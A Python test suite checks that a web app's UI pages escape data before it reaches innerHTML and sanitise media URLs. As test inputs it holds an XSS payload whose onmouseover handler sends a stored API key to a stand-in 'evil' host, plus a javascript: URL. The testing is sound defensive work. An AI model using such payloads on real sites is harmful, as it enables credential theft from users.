"""The UI's inline JS: one quote-safe esc(), no response data concatenated raw into innerHTML,
and the voice/chat fixes for error handling, the mic leak and the model race.

There is no browser harness, so these assert on the served page source. The innerHTML audit turns
every ``.innerHTML =``/``+=`` statement into its concatenation operands (string literals and esc(...)
calls removed) and requires whatever is left to be a known-safe expression. When node is installed,
esc() and safeMediaUrl() are also executed.
"""

import json
import re
import shutil
import subprocess
import unittest
from unittest import mock

from app.routers import ui

_STR = re.compile(r"'(?:\\.|[^'\\\n])*'|\"(?:\\.|[^\"\\\n])*\"")
_OPERAND = r"[A-Za-z_$][\w$]*(?:\.[A-Za-z_$][\w$]*|\[[^\]]*\]|\([^()]*\))*"

# What may still be concatenated into innerHTML after esc(...) calls and literals are removed:
# numbers, ternary conditions choosing between literals, and strings already built from esc().
_SAFE_OPERANDS = {
    "list.children.length",              # pipeline turn placeholder number
    "d.scores[i].toFixed(3)", "score.toFixed(3)", "pct",   # pipeline scores (numbers)
    "role", "why", "rule", "cls", "i", "ok",                # conditions of `x ? '...' : '...'`
    "parts.map(esc).join('')",          # voice health banner
    "detailHtml",                        # voice-clone: built from esc() pieces just above
    "clipHtml",                          # voice-clone clip report: built from esc() pieces just above
    "mkSel(2)", "mkSel(3)", "mkSel(4)",  # pipeline stage <select>: esc() pieces and static stage names
    "URL.createObjectURL", "floatChunksToWav(collected, sr)",  # a local blob: URL
}


def _page(name: str) -> str:
    with mock.patch.object(ui, "WHISPER_URL", "http://whisper"), mock.patch.object(ui, "TTS_URL", "http://tts"):
        return getattr(ui, name)().body.decode("utf-8")


def _template_to_concat(src: str) -> str:
    def conv(m: re.Match) -> str:
        parts = re.split(r"\$\{((?:[^{}]|\{[^{}]*\})*)\}", m.group(1))
        return " + ".join("''" if i % 2 == 0 else "(" + p + ")" for i, p in enumerate(parts))

    return re.sub(r"`((?:\\.|[^`\\])*)`", conv, src, flags=re.S)


def _strip_esc_calls(src: str) -> str:
    out, i = [], 0
    pat = re.compile(r"\besc\(")
    while m := pat.search(src, i):
        out.append(src[i:m.start()])
        depth, j = 1, m.end()
        while depth:
            depth += {"(": 1, ")": -1}.get(src[j], 0)
            j += 1
        out.append("''")
        i = j
    out.append(src[i:])
    return "".join(out)


def _innerhtml_operands(html: str) -> set[str]:
    js = _strip_esc_calls(_STR.sub("''", _template_to_concat(html.replace("\\'", ""))))
    found: set[str] = set()
    for m in re.finditer(r"\.innerHTML\s*\+?=", js):
        stmt = js[m.end():_statement_end(js, m.end())]
        found |= set(re.findall(r"\+\s*\(?\s*(" + _OPERAND + ")", stmt))
        found |= set(re.findall(r"(" + _OPERAND + r")\s*\)?\s*\+", stmt))
        # A bare value with no concatenation at all: `el.innerHTML = msg.content;`.
        bare = re.fullmatch(r"\s*\(*\s*(" + _OPERAND + r")\s*\)*\s*", stmt)
        if bare:
            found.add(bare.group(1))
    return found


# A line ending in one of these, or a next line starting with one, continues the expression;
# any other top-level newline ends the statement (a simplified automatic semicolon insertion).
_CONTINUES_AFTER = set("+-*/%(,[{?:=&|.<>!~^")
_CONTINUES_BEFORE = set("+-*/%.,?:)]}&|<>=^")


def _statement_end(js: str, start: int) -> int:
    """Where the statement starting at ``start`` ends: a top-level ';', a top-level newline that
    ASI would end it at, the bracket closing its enclosing block (`{ el.innerHTML = a + b }`),
    or the end of the script text, never past it."""
    depth, j = 0, start
    while j < len(js):
        c = js[j]
        if depth == 0 and c == ";":
            break
        if depth == 0 and c == "\n":
            before = js[start:j].rstrip()
            after = js[j:].lstrip()
            if before and before[-1] not in _CONTINUES_AFTER and (not after or after[0] not in _CONTINUES_BEFORE):
                break
        if c in "([{":
            depth += 1
        elif c in ")]}":
            depth -= 1
            if depth < 0:
                break
        j += 1
    return j


def _section(html: str, start: str, end: str) -> str:
    i = html.index(start)
    return html[i:html.index(end, i)]


class InnerHtmlAuditTests(unittest.TestCase):
    def _assert_no_raw_values(self, page: str) -> None:
        raw = _innerhtml_operands(_page(page)) - _SAFE_OPERANDS
        self.assertEqual(raw, set(), f"{page}: values concatenated into innerHTML without esc()")

    def test_api_keys_page(self) -> None:
        self._assert_no_raw_values("api_keys_ui")

    def test_generate_page(self) -> None:
        self._assert_no_raw_values("generate_ui")

    def test_index_page(self) -> None:
        self._assert_no_raw_values("index_ui")

    def test_pipeline_page(self) -> None:
        self._assert_no_raw_values("pipeline_ui")

    def test_guard_page(self) -> None:
        self._assert_no_raw_values("guard_ui")

    def test_voice_page(self) -> None:
        self._assert_no_raw_values("voice_ui")

    def test_voice_clone_page(self) -> None:
        self._assert_no_raw_values("voice_clone_ui")

    def test_audit_catches_a_raw_value(self) -> None:
        self.assertEqual(_innerhtml_operands("x.innerHTML = '<b>' + k.name + '</b>';"), {"k.name"})
        self.assertEqual(_innerhtml_operands("x.innerHTML = '<b>' + esc(k.name) + '</b>';"), set())
        self.assertEqual(_innerhtml_operands("x.innerHTML = `<i title=\"${k.name}\"></i>`;"), {"k.name"})


class InnerHtmlScannerTests(unittest.TestCase):
    def test_statement_without_a_semicolon_is_still_audited(self) -> None:
        self.assertIn("raw", _innerhtml_operands("el.innerHTML = '<b>' + raw"))
        self.assertIn("raw", _innerhtml_operands("f(() => { el.innerHTML = '<b>' + raw })\nnext();"))
        self.assertIn("raw", _innerhtml_operands("el.innerHTML = ('<b>' + raw"))  # unbalanced to EOF

    # pack-agent-composer-4acf0e712e
    def test_bare_assignment_is_reported(self) -> None:
        cases = ["el.innerHTML = msg.content;", "el.innerHTML = (data.html);", "el.innerHTML += x\n",
                 "el.innerHTML = esc(msg.content);", "el.innerHTML = '';"]
        self.assertEqual([_innerhtml_operands(c) for c in cases],
                         [{"msg.content"}, {"data.html"}, {"x"}, set(), set()])

    # pack-agent-composer-8b3748b243
    def test_newline_ends_a_statement_unless_the_expression_continues(self) -> None:
        cases = [
            "el.innerHTML = '<b>' + a\nconst url = base + id;",
            "el.innerHTML = '<b>' +\n  a\nother = b + c;",
            "el.innerHTML = '<b>'\n  + a;\nother = b + c;",
        ]
        self.assertEqual([_innerhtml_operands(c) for c in cases], [{"a"}, {"a"}, {"a"}])


class EscHelperTests(unittest.TestCase):
    def test_esc_escapes_quotes(self) -> None:
        self.assertIn("&quot;", ui.ESC_JS)
        self.assertIn("&#39;", ui.ESC_JS)

    def test_every_page_gets_the_one_esc(self) -> None:
        for page in ("api_keys_ui", "generate_ui", "pipeline_ui", "guard_ui", "voice_ui", "voice_clone_ui"):
            html = _page(page)
            self.assertEqual(html.count("function esc("), 1, page)
            self.assertNotIn("escHtml", html, page)

    def test_stage1_label_title_uses_esc(self) -> None:
        html = _page("pipeline_ui")
        self.assertIn("""title="'+esc(lbl)+'\"""", html)
        self.assertIn("""value="'+esc(m)+'\"""", html)

    @unittest.skipUnless(shutil.which("node"), "node not installed")
    def test_esc_runs_in_node(self) -> None:
        payload = """x" onmouseover="fetch('//evil/'+localStorage.rag_api_key)" <b>&"""
        script = ui.ESC_JS + "\nprocess.stdout.write(JSON.stringify([esc(%s), esc(null), esc(5)]));" % json.dumps(payload)
        out = subprocess.run(["node", "-e", script], capture_output=True, text=True, check=True, timeout=30).stdout
        escaped, null, five = json.loads(out)
        self.assertNotIn('"', escaped)
        self.assertNotIn("'", escaped)
        self.assertNotIn("<", escaped)
        self.assertEqual(
            escaped,
            "x&quot; onmouseover=&quot;fetch(&#39;//evil/&#39;+localStorage.rag_api_key)&quot; &lt;b&gt;&amp;",
        )
        self.assertEqual((null, five), ("", "5"))


class ApiKeysPageTests(unittest.TestCase):
    def test_rows_are_built_with_dom_api(self) -> None:
        loop = _section(_page("api_keys_ui"), "data.forEach(k =>", "tableEl.style.display")
        self.assertNotIn("innerHTML", loop)
        self.assertIn("textContent", loop)
        self.assertIn("btn.dataset.id = k.id", loop)


class GeneratePageTests(unittest.TestCase):
    def test_render_media_uses_properties_not_markup(self) -> None:
        fn = _section(_page("generate_ui"), "function renderMedia(", "async function checkOutputImage")
        self.assertNotIn("innerHTML", fn)
        self.assertIn("safeMediaUrl(m.url)", fn)
        self.assertIn("meta.textContent", fn)
        self.assertIn("img.alt", fn)

    @unittest.skipUnless(shutil.which("node"), "node not installed")
    def test_safe_media_url_runs_in_node(self) -> None:
        fn = _section(_page("generate_ui"), "function safeMediaUrl(", "function renderMedia(").replace("{{", "{")
        script = (
            "const window = {location: {href: 'http://host:9150/ui/generate'}};\n" + fn
            + "\nprocess.stdout.write(JSON.stringify(["
            "safeMediaUrl('/api/media/1'), safeMediaUrl('https://cdn.example/x.png'),"
            "safeMediaUrl('javascript:alert(1)'), safeMediaUrl('data:text/html,x'), safeMediaUrl(null)]));"
        )
        out = subprocess.run(["node", "-e", script], capture_output=True, text=True, check=True, timeout=30).stdout
        self.assertEqual(
            json.loads(out),
            ["http://host:9150/api/media/1", "https://cdn.example/x.png", "", "", ""],
        )


class VoicePageTests(unittest.TestCase):
    def test_stream_synthesis_checks_status_and_catches_reads(self) -> None:
        handler = _section(_page("voice_ui"), 'synthStreamBtn.addEventListener("click"', "})();")
        self.assertIn("if (!response.ok)", handler)
        read = _section(handler, "function read()", "read();\n        }).catch")
        self.assertIn("}).catch(err => {", read)
        self.assertIn("synthStreamBtn.disabled = false", read[read.index("}).catch(err => {"):])

    def test_recorder_falls_back_and_releases_the_mic(self) -> None:
        start = _section(_page("voice_ui"), "function startRecording()", "function stopRecording()")
        self.assertIn("MediaRecorder.isTypeSupported(preferred)", start)
        self.assertNotIn('new MediaRecorder(stream, { mimeType: "audio/webm;codecs=opus" })', start)
        guarded = start[start.index("try {"):start.index("mediaRecorder.ondataavailable")]
        self.assertIn("new MediaRecorder(stream, opts)", guarded)
        self.assertIn("stream.getTracks().forEach(t => t.stop())", guarded[guarded.index("catch"):])

    def test_audio_items_are_built_with_dom_api(self) -> None:
        fn = _section(_page("voice_ui"), "function addAudioItem(", "synthBtn.addEventListener")
        self.assertNotIn("innerHTML", fn)
        self.assertIn("t.textContent = text", fn)


class ChatPageTests(unittest.TestCase):
    def test_conversation_loads_after_models(self) -> None:
        html = _page("chat_ui")
        init = html[html.index("resetBtn.addEventListener"):]
        self.assertRegex(init, r"loadModels\(\)\.(then|finally)\(\(\) => \{\s*if \(q\.cid\) loadConversation\(q\.cid\)")
        self.assertNotRegex(init, r"loadModels\(\);\s*const q")


if __name__ == "__main__":
    unittest.main()
